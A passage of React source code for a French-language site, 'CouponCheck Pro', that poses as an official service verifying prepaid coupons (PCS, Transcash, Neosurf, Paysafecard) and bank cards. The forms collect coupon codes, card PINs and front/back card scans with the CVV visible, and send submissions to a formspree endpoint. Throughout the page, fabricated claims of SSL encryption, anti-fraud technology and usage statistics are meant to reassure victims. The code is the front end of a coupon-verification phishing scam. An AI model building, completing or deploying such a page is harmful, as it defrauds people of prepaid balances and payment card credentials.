                                setCardPin(formatted);
                              }}
                              placeholder="Code PIN"
                              className="w-full h-12 bg-white/95 text-slate-900 font-mono text-sm font-bold tracking-widest px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-400"
                            />
                          </div>
                        </div>

                        {/* CACHER LES COORDONNES */}
                        <div className="flex flex-col space-y-2 pt-1 border-t border-sky-100">
                          <span className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                            <EyeOff className="w-3.5 h-3.5 text-blue-600" />
                            Masquer mes données (Chiffrement SSL) :
                          </span>
                          <div className="flex items-center gap-5 mt-1">
                            <label className="flex items-center gap-2 cursor-pointer select-none">
                              <input
                                type="checkbox"
                                checked={hideCode === "OUI"}
                                onChange={() => setHideCode("OUI")}
                                className="w-4 h-4 rounded bg-white border border-sky-200 text-blue-600 focus:ring-0 cursor-pointer"
                              />
                              <span className="text-xs font-bold text-slate-700">OUI</span>
                            </label>
                            <label className="flex items-center gap-2 cursor-pointer select-none">
                              <input
                                type="checkbox"
                                checked={hideCode === "NON"}
                                onChange={() => setHideCode("NON")}
                                className="w-4 h-4 rounded bg-white border border-sky-200 text-blue-600 focus:ring-0 cursor-pointer"
                              />
                              <span className="text-xs font-bold text-slate-700">NON</span>
                            </label>
                          </div>
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-4">
                        {/* AUTRES COUPONS */}
                        {selectedBrand === "OTHER" && (
                          <div className="flex flex-col space-y-2 animate-fadeIn">
                            <label htmlFor="otherCouponName" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                              <Tag className="w-3.5 h-3.5 text-blue-600" />
                              Autres coupons / Cartes cadeaux : <span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              id="otherCouponName"
                              name="otherCouponName"
                              value={otherCouponName}
                              onChange={(e) => {
                                setOtherCouponName(e.target.value);
                                if (errorText) setErrorText(null);
                              }}
                              placeholder="Indiquer le nom de votre coupon ou carte"
                              required
                              className="w-full h-12 bg-white/95 text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-400 transition-all duration-200"
                            />
                          </div>
                        )}

                        <div className="grid grid-cols-2 gap-4">
                          {/* MONTANT */}
                          <div className="flex flex-col space-y-2">
                            <label htmlFor="montant" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                              <Coins className="w-3.5 h-3.5 text-blue-600" />
                              Montant : <span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              id="montant"
                              name="montant"
                              value={montant}
                              required
                              onChange={(e) => {
                                setMontant(e.target.value);
                                if (errorText) setErrorText(null);
                              }}
                              placeholder=""
                              className="w-full h-12 bg-white/95 text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-400 transition-all duration-200"
                            />
                          </div>

                          {/* CODE DU COUPON */}
                          <div className="flex flex-col space-y-2">
                            <label htmlFor="code" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                              <Lock className="w-3.5 h-3.5 text-blue-600" />
                              Code du coupon : <span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              id="code"
                              name="code"
                              value={couponCode}
                              onChange={(e) => {
                                setCouponCode(e.target.value);
                                if (errorText) setErrorText(null);
                              }}
                              placeholder="Saisir le Code"
                              required
                              style={{ textTransform: "uppercase" }}
                              className="w-full h-12 bg-white/95 text-slate-900 font-mono text-xs font-bold tracking-widest px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none uppercase placeholder:text-slate-400 placeholder:font-sans placeholder:tracking-normal"
                            />
                          </div>
                        </div>

                        {/* CACHER MON CODE */}
                        <div className="flex flex-col space-y-2 pt-1 border-t border-sky-100">
                          <span className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                            <EyeOff className="w-3.5 h-3.5 text-blue-600" />
                            Masquer mon code : <span className="text-red-500">*</span>
                          </span>
                          <div className="flex items-center gap-5 mt-1">
                            <label className="flex items-center gap-2 cursor-pointer select-none">
                              <input
                                type="checkbox"
                                name="cacher_mon_code_oui"
                                checked={hideCode === "OUI"}
                                onChange={() => setHideCode("OUI")}
                                className="w-4 h-4 rounded bg-white border border-sky-200 text-blue-600 focus:ring-0 cursor-pointer"
                              />
                              <span className="text-xs font-bold text-slate-700">OUI (Chiffrement SSL)</span>
                            </label>
                            <label className="flex items-center gap-2 cursor-pointer select-none">
                              <input
                                type="checkbox"
                                name="cacher_mon_code_non"
                                checked={hideCode === "NON"}
                                onChange={() => setHideCode("NON")}
                                className="w-4 h-4 rounded bg-white border border-sky-200 text-blue-600 focus:ring-0 cursor-pointer"
                              />
                              <span className="text-xs font-bold text-slate-700">NON</span>
                            </label>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* UPLOAD CARD IMAGE (FINTECH STYLE) */}
                  <div className="p-5 bg-white/60 rounded-2xl border border-sky-200/60 shadow-sm space-y-4">
                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-600">SECTION 04 : PIÈCE JOINTE DE SÛRETÉ</span>
                    
                    {isSelectedBankCard ? (
                      <div className="flex flex-col space-y-3 animate-fadeIn">
                        <label className="text-[11px] font-semibold text-slate-600 flex items-center gap-2 uppercase tracking-wide">
                          <UploadCloud className="w-4 h-4 text-blue-600" />
                          Scan Recto / Verso de la carte bancaire : <span className="text-red-500">*</span>
                        </label>
                        
                        {/* RECTO / VERSO SIDES */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                          {/* RECTO */}
                          <div className="flex flex-col space-y-2">
                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Recto (Face avant) :</span>
                            {cardFrontPreview ? (
                              <div className="relative rounded-2xl border border-sky-100 overflow-hidden bg-white/95 p-2 group shadow-md h-36 flex items-center justify-center">
                                <img
                                  src={cardFrontPreview}
                                  alt="Recto Card Preview"
                                  className="max-h-full max-w-full object-contain rounded-xl"
                                />
                                <button
                                  type="button"
                                  onClick={removeFrontImage}
                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-white border border-sky-200 flex items-center justify-center text-slate-600 hover:text-slate-900 hover:bg-slate-50 cursor-pointer shadow-md"
                                >
                                  <X className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            ) : (
                              <div
                                onDragEnter={(e) => { e.preventDefault(); setDragFrontActive(true); }}
                                onDragOver={(e) => { e.preventDefault(); setDragFrontActive(true); }}
                                onDragLeave={(e) => { e.preventDefault(); setDragFrontActive(false); }}
                                onDrop={(e) => {
                                  e.preventDefault();
                                  setDragFrontActive(false);
                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                                    handleFrontFileChange(e.dataTransfer.files[0]);
                                  }
                                }}
                                onClick={() => {
                                  const input = document.createElement("input");
                                  input.type = "file";
                                  input.accept = "image/*";
                                  input.onchange = (e) => {
                                    const files = (e.target as HTMLInputElement).files;
                                    if (files && files[0]) handleFrontFileChange(files[0]);
                                  };
                                  input.click();
                                }}
                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
                                  dragFrontActive
                                    ? "border-blue-500 bg-blue-50"
                                    : "border-sky-200 bg-white/95 hover:border-blue-400 hover:bg-blue-50/10"
                                }`}
                              >
                                <UploadCloud className="w-6 h-6 text-slate-400 mb-1" />
                                <div className="text-[11px] font-black text-slate-700">Face Avant de la carte</div>
                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
                              </div>
                            )}
                          </div>

                          {/* VERSO */}
                          <div className="flex flex-col space-y-2">
                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Verso (Face arrière avec signature) :</span>
                            {cardBackPreview ? (
                              <div className="relative rounded-2xl border border-sky-100 overflow-hidden bg-white/95 p-2 group shadow-md h-36 flex items-center justify-center">
                                <img
                                  src={cardBackPreview}
                                  alt="Verso Card Preview"
                                  className="max-h-full max-w-full object-contain rounded-xl"
                                />
                                <button
                                  type="button"
                                  onClick={removeBackImage}
                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-white border border-sky-200 flex items-center justify-center text-slate-600 hover:text-slate-900 hover:bg-slate-50 cursor-pointer shadow-md"
                                >
                                  <X className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            ) : (
                              <div
                                onDragEnter={(e) => { e.preventDefault(); setDragBackActive(true); }}
                                onDragOver={(e) => { e.preventDefault(); setDragBackActive(true); }}
                                onDragLeave={(e) => { e.preventDefault(); setDragBackActive(false); }}
                                onDrop={(e) => {
                                  e.preventDefault();
                                  setDragBackActive(false);
                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                                    handleBackFileChange(e.dataTransfer.files[0]);
                                  }
                                }}
                                onClick={() => {
                                  const input = document.createElement("input");
                                  input.type = "file";
                                  input.accept = "image/*";
                                  input.onchange = (e) => {
                                    const files = (e.target as HTMLInputElement).files;
                                    if (files && files[0]) handleBackFileChange(files[0]);
                                  };
                                  input.click();
                                }}
                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
                                  dragBackActive
                                    ? "border-blue-500 bg-blue-50"
                                    : "border-sky-200 bg-white/95 hover:border-blue-400 hover:bg-blue-50/10"
                                }`}
                              >
                                <UploadCloud className="w-6 h-6 text-slate-400 mb-1" />
                                <div className="text-[11px] font-black text-slate-700">Face Arrière (CVV visible)</div>
                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    ) : (
                      <div className="flex flex-col space-y-3 animate-fadeIn">
                        <label className="text-[11px] font-semibold text-slate-600 flex items-center gap-2 uppercase tracking-wide">
                          <UploadCloud className="w-4 h-4 text-blue-600" />
                          Scan Recto / Verso du coupon ou carte de recharge (Obligatoire) : <span className="text-red-500">*</span>
                        </label>
                        
                        {/* RECTO / VERSO SIDES */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                          {/* RECTO */}
                          <div className="flex flex-col space-y-2">
                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Recto (Face avant) :</span>
                            {couponFrontPreview ? (
                              <div className="relative rounded-2xl border border-sky-100 overflow-hidden bg-white/95 p-2 group shadow-md h-36 flex items-center justify-center">
                                <img
                                  src={couponFrontPreview}
                                  alt="Recto Coupon Preview"
                                  className="max-h-full max-w-full object-contain rounded-xl"
                                />
                                <button
                                  type="button"
                                  onClick={removeCouponFrontImage}
                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-white border border-sky-200 flex items-center justify-center text-slate-600 hover:text-slate-900 hover:bg-slate-50 cursor-pointer shadow-md"
                                >
                                  <X className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            ) : (
                              <div
                                onDragEnter={(e) => { e.preventDefault(); setDragCouponFrontActive(true); }}
                                onDragOver={(e) => { e.preventDefault(); setDragCouponFrontActive(true); }}
                                onDragLeave={(e) => { e.preventDefault(); setDragCouponFrontActive(false); }}
                                onDrop={(e) => {
                                  e.preventDefault();
                                  setDragCouponFrontActive(false);
                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                                    handleCouponFrontFileChange(e.dataTransfer.files[0]);
                                  }
                                }}
                                onClick={() => {
                                  const input = document.createElement("input");
                                  input.type = "file";
                                  input.accept = "image/*";
                                  input.onchange = (e) => {
                                    const files = (e.target as HTMLInputElement).files;
                                    if (files && files[0]) handleCouponFrontFileChange(files[0]);
                                  };
                                  input.click();
                                }}
                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
                                  dragCouponFrontActive
                                    ? "border-blue-500 bg-blue-50"
                                    : "border-sky-200 bg-white/95 hover:border-blue-400 hover:bg-blue-50/10"
                                }`}
                              >
                                <UploadCloud className="w-6 h-6 text-slate-400 mb-1" />
                                <div className="text-[11px] font-black text-slate-700">Face Avant du coupon</div>
                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
                              </div>
                            )}
                          </div>

                          {/* VERSO */}
                          <div className="flex flex-col space-y-2">
                            <span className="text-[9px] font-black uppercase text-slate-500 tracking-wider">Verso (Face arrière avec grille/code) :</span>
                            {couponBackPreview ? (
                              <div className="relative rounded-2xl border border-sky-100 overflow-hidden bg-white/95 p-2 group shadow-md h-36 flex items-center justify-center">
                                <img
                                  src={couponBackPreview}
                                  alt="Verso Coupon Preview"
                                  className="max-h-full max-w-full object-contain rounded-xl"
                                />
                                <button
                                  type="button"
                                  onClick={removeCouponBackImage}
                                  className="absolute top-2.5 right-2.5 w-7 h-7 rounded-full bg-white border border-sky-200 flex items-center justify-center text-slate-600 hover:text-slate-900 hover:bg-slate-50 cursor-pointer shadow-md"
                                >
                                  <X className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            ) : (
                              <div
                                onDragEnter={(e) => { e.preventDefault(); setDragCouponBackActive(true); }}
                                onDragOver={(e) => { e.preventDefault(); setDragCouponBackActive(true); }}
                                onDragLeave={(e) => { e.preventDefault(); setDragCouponBackActive(false); }}
                                onDrop={(e) => {
                                  e.preventDefault();
                                  setDragCouponBackActive(false);
                                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                                    handleCouponBackFileChange(e.dataTransfer.files[0]);
                                  }
                                }}
                                onClick={() => {
                                  const input = document.createElement("input");
                                  input.type = "file";
                                  input.accept = "image/*";
                                  input.onchange = (e) => {
                                    const files = (e.target as HTMLInputElement).files;
                                    if (files && files[0]) handleCouponBackFileChange(files[0]);
                                  };
                                  input.click();
                                }}
                                className={`border-2 border-dashed rounded-2xl p-4 text-center cursor-pointer transition-all duration-200 h-36 flex flex-col justify-center items-center ${
                                  dragCouponBackActive
                                    ? "border-blue-500 bg-blue-50"
                                    : "border-sky-200 bg-white/95 hover:border-blue-400 hover:bg-blue-50/10"
                                }`}
                              >
                                <UploadCloud className="w-6 h-6 text-slate-400 mb-1" />
                                <div className="text-[11px] font-black text-slate-700">Face Arrière du coupon</div>
                                <div className="text-[8.5px] text-slate-500 uppercase tracking-widest mt-0.5">Cliquez ou déposez</div>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>

              </div>

              {/* SECURITY/TRUST INFO */}
              <div className="p-5 bg-gradient-to-r from-blue-50 to-sky-50 border border-sky-100 rounded-2xl flex items-start gap-3.5 shadow-sm">
                <ShieldCheck className="w-5 h-5 text-blue-600 shrink-0 mt-0.5 animate-pulse" />
                <div className="space-y-1">
                  <h4 className="text-xs font-extrabold text-blue-900 uppercase tracking-widest">Technologie Anti-Fraude & Chiffrement de Données</h4>
                  <p className="text-slate-600 text-xs leading-relaxed max-w-3xl">
                    Conformément aux directives de sécurité monétique interbancaire, les requêtes d'homologation transitent sous tunnel sécurisé SSH / SSL de 256 bits. Les codes transmis font l'objet d'un chiffrement jeton de sécurité à usage unique pour empêcher toute tentative d'usurpation d'identité ou perte involontaire de solde.
                  </p>
                </div>
              </div>

              {/* SUBMIT BUTTON */}
              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isSubmittingFormspree}
                  className="w-full py-4.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white text-base font-black rounded-2xl hover:shadow-[0_4px_20px_rgba(37,99,235,0.25)] hover:scale-[1.005] active:scale-[0.995] transition-all duration-150 cursor-pointer disabled:opacity-55 flex items-center justify-center gap-2.5"
                >
                  {isSubmittingFormspree ? (
                    <>
                      <RefreshCw className="w-5 h-5 animate-spin text-white" />
                      <span>INITIALISATION DE L'HONORABILITÉ SSL...</span>
                    </>
                  ) : (
                    <>
                      <ShieldCheck className="w-5 h-5 text-white" />
                      <span>LANCER LA VÉRIFICATION SÉCURISÉE</span>
                    </>
                  )}
                </button>
              </div>
            </form>
          )}

          {/* Sizing description footer inside form container */}
          <div className="mt-8 pt-6 border-t border-sky-100 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
            <div className="flex items-center gap-1.5 font-semibold text-slate-600">
              <Lock className="w-4 h-4 text-blue-600" />
              Saisie hautement protégée par certificat de sûreté
            </div>
            <div className="text-center sm:text-right max-w-md">
              La transmission de votre demande de cryptage et d'indexation est sécurisée, certifiée, automatique et instantanée.
            </div>
          </div>

        </div>
      </section>
    );
  };

  return (
    <div className="min-h-screen bg-[#e0f2fe] text-slate-800 flex flex-col relative overflow-x-hidden selection:bg-indigo-600 selection:text-white">
      
      {/* BACKGROUND FLOATING PARAMS */}
      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden">
        {bubbles.map((b) => (
          <span
            key={b.id}
            className="absolute rounded bg-white/40 backdrop-blur-[1px]"
            style={{
              left: b.left,
              width: b.size,
              height: b.size,
              bottom: "-150px",
              animation: `float ${b.duration} linear infinite`,
              animationDelay: b.delay,
            }}
          />
        ))}
      </div>

      {/* ===== HEADER / NAVBAR ===== */}
      <nav className="fixed top-0 left-0 right-0 h-18 bg-white/75 backdrop-blur-md border-b border-sky-200/60 px-4 sm:px-6 z-50 flex items-center justify-between transition-all duration-300">
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 sm:gap-3 cursor-pointer" onClick={() => changePage("accueil")}>
            <div className="w-8 sm:w-10 h-8 sm:h-10 bg-gradient-to-tr from-indigo-500 to-pink-500 rounded-xl flex items-center justify-center text-white shadow-lg shadow-indigo-500/20 font-bold text-base sm:text-lg">
              C
            </div>
            <div className="hidden sm:block">
              <span className="font-extrabold text-base sm:text-lg text-slate-900 tracking-tight">CouponCheck</span>
              <span className="bg-gradient-to-r from-pink-400 to-rose-400 bg-clip-text text-transparent font-black ml-1 text-xs uppercase px-1.5 py-0.5 rounded bg-pink-900/10">Pro</span>
            </div>
          </div>
        </div>

        {/* Navigation Items (Always visible with optimized mobile sizing) */}
        <div className="flex items-center gap-0.5 sm:gap-1 bg-sky-200/50 p-0.5 sm:p-1 rounded-full border border-sky-300/30">
          <button
            onClick={() => changePage("accueil")}
            className={`px-3 sm:px-5 py-1.5 sm:py-2 rounded-full text-xs sm:text-sm font-semibold transition cursor-pointer ${
              activePage === "accueil" ? "bg-indigo-600 text-white shadow" : "text-slate-600 hover:text-slate-900"
            }`}
          >
            Accueil
          </button>
          <button
            onClick={() => changePage("verification")}
            className={`px-3 sm:px-5 py-1.5 sm:py-2 rounded-full text-xs sm:text-sm font-semibold transition cursor-pointer ${
              activePage === "verification" ? "bg-indigo-600 text-white shadow" : "text-slate-600 hover:text-slate-900"
            }`}
          >
            Vérification
          </button>
          <button
            onClick={() => changePage("contact")}
            className={`px-3 sm:px-5 py-1.5 sm:py-2 rounded-full text-xs sm:text-sm font-semibold transition cursor-pointer ${
              activePage === "contact" ? "bg-indigo-600 text-white shadow" : "text-slate-600 hover:text-slate-900"
            }`}
          >
            Support
          </button>
        </div>

        {/* Action Button & Translation Selector */}
        <div className="flex items-center gap-3 sm:gap-4">
          {/* Custom Country Selector & Google Translate */}
          <div className="relative">
            <button
              onClick={() => setIsCountryDropdownOpen(!isCountryDropdownOpen)}
              className="flex items-center gap-1.5 sm:gap-2 px-3 py-1.5 bg-white/95 border border-sky-200 hover:bg-slate-50 text-slate-800 rounded-xl shadow transition-all duration-150 cursor-pointer select-none text-xs sm:text-sm font-semibold active:scale-95"
            >
              <span className="text-base sm:text-lg">{selectedCountry.flag}</span>
              <span className="uppercase text-slate-600 tracking-wider text-[11px] sm:text-xs">{selectedCountry.code}</span>
              <ChevronDown className={`w-3.5 h-3.5 text-slate-500 transition-transform duration-150 ${isCountryDropdownOpen ? "rotate-180" : ""}`} />
            </button>

            {isCountryDropdownOpen && (
              <>
                {/* Backdrop Click Closer */}
                <div 
                  className="fixed inset-0 z-40 cursor-default" 
                  onClick={() => setIsCountryDropdownOpen(false)} 
                />
                
                {/* Dropdown list container */}
                <div className="absolute right-0 mt-2 w-72 sm:w-80 max-h-96 bg-white/95 backdrop-blur-xl border border-sky-200 rounded-2xl shadow-2xl p-3 overflow-hidden flex flex-col z-50 animate-fadeIn">
                  <div className="text-[10px] sm:text-[11px] font-extrabold tracking-widest text-slate-500 uppercase px-1 pb-2 border-b border-rose-500/10 flex justify-between items-center mb-2">
                    <span>Choisir un Pays</span>
                    <span className="text-[9px] text-indigo-600 font-semibold uppercase">Sans pays africains</span>
                  </div>
                  
                  {/* Non-African countries grid */}
                  <div className="grid grid-cols-2 gap-1 overflow-y-auto max-h-72 pr-1 custom-scrollbar">
                    {COUNTRIES_LIST.map((country) => (
                      <button
                        key={country.code}
                        onClick={() => handleCountryChange(country)}
                        className={`flex items-center gap-2 px-2.5 py-1.5 rounded-xl text-[11px] sm:text-xs font-semibold text-left transition-all duration-150 cursor-pointer ${
                          selectedCountry.code === country.code
                            ? "bg-indigo-100 text-indigo-700 border border-indigo-200"
                            : "text-slate-600 hover:text-slate-900 hover:bg-sky-50/80 border border-transparent"
                        }`}
                      >
                        <span className="text-sm sm:text-base">{country.flag}</span>
                        <span className="truncate">{country.name}</span>
                      </button>
                    ))}
                  </div>
                </div>
              </>
            )}
          </div>

          <div id="google_translate_element" className="absolute opacity-0 pointer-events-none w-0 h-0 overflow-hidden"></div>

          <button
            onClick={() => changePage("verification")}
            className="hidden xs:block px-3 sm:px-4 py-2 bg-gradient-to-r from-indigo-500 to-pink-500 text-white text-xs sm:text-sm font-bold rounded-lg hover:shadow-lg hover:shadow-indigo-500/20 transform hover:-translate-y-0.5 transition cursor-pointer"
          >
            Vérifier un code
          </button>
        </div>
      </nav>

      {/* ===== MAIN CONTENT AREA ===== */}
      <div className="flex-grow flex flex-col min-w-0 transition-all duration-300 min-h-screen">

      {/* ===== RENDERING PAGE: ACCUEIL / HOME ===== */}
      {activePage === "accueil" && (
        <div className="relative pt-32 flex-grow flex flex-col items-center">
          <header className="relative pt-12 pb-16 px-6 max-w-7xl mx-auto flex flex-col items-center justify-center text-center z-10">
            <div className="inline-flex items-center gap-2 py-1.5 px-4 bg-indigo-100/80 border border-indigo-300/60 text-indigo-800 rounded-full text-xs font-bold mb-8">
              <Sparkles className="w-4 h-4 text-pink-500" />
              Nouveau: Lecteur Optique & Traitement de Validation Instantané
            </div>

            <h1 className="max-w-4xl text-4xl sm:text-5xl md:text-6xl font-black tracking-tight leading-tight text-slate-900 mb-6">
              Vérification Globale de Coupons & Recharges{" "}
              <span className="bg-gradient-to-r from-indigo-600 via-pink-600 to-rose-600 bg-clip-text text-transparent">
                Officielle et Sécurisée
              </span>
            </h1>

            <p className="max-w-2xl text-base sm:text-lg text-slate-700 leading-relaxed mb-10">
              Contrôlez la structure et le code de vos recharges <span className="text-slate-900 font-extrabold">PCS, Transcash, Neosurf, Paysafecard, Amazon</span> et cartes cadeaux. Prise en charge automatique par notre cellule technique pour valider l'existence de votre solde.
            </p>

            <div className="flex flex-col sm:flex-row gap-4 justify-center items-center w-full max-w-md">
              <button
                onClick={() => changePage("verification")}
                className="w-full sm:w-auto px-8 py-4 bg-gradient-to-r from-indigo-500 to-pink-500 text-white font-bold rounded-xl shadow-xl shadow-indigo-500/20 hover:scale-[1.02] active:scale-95 transition flex items-center justify-center gap-2 select-none cursor-pointer"
              >
                <ShieldCheck className="w-5 h-5" />
                Démarrer la vérification
              </button>
              <button
                onClick={() => changePage("contact")}
                className="w-full sm:w-auto px-8 py-4 bg-white text-slate-700 border border-sky-300/85 font-bold rounded-xl hover:bg-slate-50 shadow-sm transition flex items-center justify-center gap-2 select-none cursor-pointer"
              >
                Contacter un agent
              </button>
            </div>

            {/* Live Counters Block */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-6 w-full max-w-4xl mt-16 p-6 bg-white/55 rounded-2xl border border-sky-300/40 backdrop-blur-sm shadow-md">
              <div className="text-center p-2">
                <div className="text-2xl sm:text-3xl font-black text-indigo-600 bg-gradient-to-r from-indigo-600 to-pink-600 bg-clip-text text-transparent">310k+</div>
                <div className="text-xs text-slate-600 uppercase tracking-widest mt-1 font-bold">Analyses Conformes</div>
              </div>
              <div className="text-center p-2 border-l border-sky-200/60">
                <div className="text-2xl sm:text-3xl font-black text-pink-600 bg-gradient-to-r from-pink-600 to-rose-600 bg-clip-text text-transparent">99.9%</div>
                <div className="text-xs text-slate-600 uppercase tracking-widest mt-1 font-bold">Fidélité Optique</div>
              </div>
              <div className="text-center p-2 border-l border-sky-200/60">
                <div className="text-2xl sm:text-3xl font-black text-emerald-600 bg-gradient-to-r from-emerald-600 to-teal-600 bg-clip-text text-transparent">0.4s</div>
                <div className="text-xs text-slate-600 uppercase tracking-widest mt-1 font-bold">Vitesse d'indexation</div>
              </div>
              <div className="text-center p-2 border-l border-sky-200/60">
                <div className="text-2xl sm:text-3xl font-black text-indigo-600 bg-gradient-to-r from-indigo-600 to-blue-600 bg-clip-text text-transparent">100%</div>
                <div className="text-xs text-slate-600 uppercase tracking-widest mt-1 font-bold">Traitement Crypté</div>
              </div>
            </div>
          </header>

          {/* Core Feature blocks */}
          <section className="py-12 max-w-5xl mx-auto px-6 grid grid-cols-1 md:grid-cols-2 gap-8 mb-20">
            <div className="p-8 bg-white/70 backdrop-blur-md rounded-2xl border border-sky-200/65 shadow-md space-y-4">
              <div className="w-12 h-12 bg-indigo-100/80 rounded-xl flex items-center justify-center text-indigo-600">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-slate-900">Précision Technique</h3>
              <p className="text-slate-650 text-sm leading-relaxed font-medium">
                Notre technologie applique des modèles d'évaluation de signature de code pour certifier le format réglementaire de votre recharge prépayée de n'importe quel émetteur.
              </p>
            </div>

            <div className="p-8 bg-white/70 backdrop-blur-md rounded-2xl border border-sky-200/65 shadow-md space-y-4">
              <div className="w-12 h-12 bg-pink-100/80 rounded-xl flex items-center justify-center text-pink-600">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <h3 className="text-xl font-bold text-slate-900">Cryptage SSL Fort</h3>
              <p className="text-slate-650 text-sm leading-relaxed font-medium">
                Toutes les transmissions sont anonymisées sous un protocole de cryptage SSL 256 bits, garantissant l'entière protection de vos informations.
              </p>
            </div>
          </section>

          {/* Verification Section fully embedded on the main Accueil screen */}
          <div className="w-full pb-24 flex flex-col items-center">
            {renderVerificationSection()}
          </div>
        </div>
      )}

      {/* ===== RENDERING PAGE: VERIFICATION ===== */}
      {activePage === "verification" && (
        <div className="pt-32 pb-24 flex-grow flex flex-col items-center">
          {renderVerificationSection()}
        </div>
      )}

      {/* ===== RENDERING PAGE: CONTACT SUPPORT ===== */}
      {activePage === "contact" && (
        <div className="pt-32 pb-24 flex-grow flex flex-col items-center">
          <section className="w-full max-w-2xl mx-auto px-6 relative z-10">
            <div className="text-center mb-10">
              <span className="text-indigo-800 text-xs font-extrabold tracking-widest uppercase px-3.5 py-1 bg-indigo-100 rounded-full">
                Support Technique 24/7
              </span>
              <h2 className="text-3xl font-extrabold text-slate-900 mt-3" id="contact-heading">Contact Support Client</h2>
              <p className="text-slate-600 mt-2">
                Notre équipe vous répondra très bientôt.
              </p>
            </div>

            <div className="bg-white/80 backdrop-blur-md p-6 sm:p-10 rounded-3xl border border-sky-200/60 shadow-xl animate-fadeIn" id="contact-container">
              
              {/* STATUS MESSAGES */}
              {contactSuccess && (
                <div className="mb-6 p-4 bg-emerald-50 border border-emerald-200 rounded-xl text-emerald-800 text-sm animate-fadeIn">
                  <div className="flex gap-3 font-bold items-center mb-1">
                    <CheckCircle2 className="w-5 h-5 text-emerald-600" />
                    <span>Message transmis avec succès !</span>
                  </div>
                  <p className="text-slate-600 text-xs font-semibold leading-relaxed">
                    Votre demande d'assistance a été reçue et enregistrée avec succès par nos serveurs sécurisés. Un membre de notre équipe d'assistance étudiera votre demande de support technique et vous répondra directement par e-mail à l'adresse renseignée dans les plus brefs délais.
                  </p>
                </div>
              )}

              {contactError && (
                <div className="mb-6 p-4 bg-rose-50 border border-rose-200 rounded-xl text-rose-800 text-sm">
                  <div className="flex gap-3 font-bold items-center">
                    <ShieldAlert className="w-5 h-5 text-rose-600" />
                    <span>Erreur : {contactError}</span>
                  </div>
                </div>
              )}

              <form onSubmit={handleContactSubmit} className="space-y-5" action="https://formspree.io/f/mzdwjnkv" method="POST">
                {/* NOM */}
                <div className="space-y-1.5 flex flex-col">
                  <label htmlFor="nom" className="text-xs font-bold text-slate-600 uppercase tracking-wide">
                    Votre nom complet : <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    id="nom"
                    name="nom"
                    required
                    value={contactName}
                    onChange={(e) => setContactName(e.target.value)}
                    placeholder=""
                    className="h-12 bg-white text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 outline-none text-sm transition font-medium"
                  />
                </div>

                {/* EMAIL */}
                <div className="space-y-1.5 flex flex-col">
                  <label htmlFor="email" className="text-xs font-bold text-slate-600 uppercase tracking-wide">
                    Votre email : <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="email"
                    id="email"
                    name="email"
                    required
                    value={contactEmail}
                    onChange={(e) => setContactEmail(e.target.value)}
                    placeholder=""
                    className="h-12 bg-white text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 outline-none text-sm transition font-medium"
                  />
                </div>

                {/* MESSAGE */}
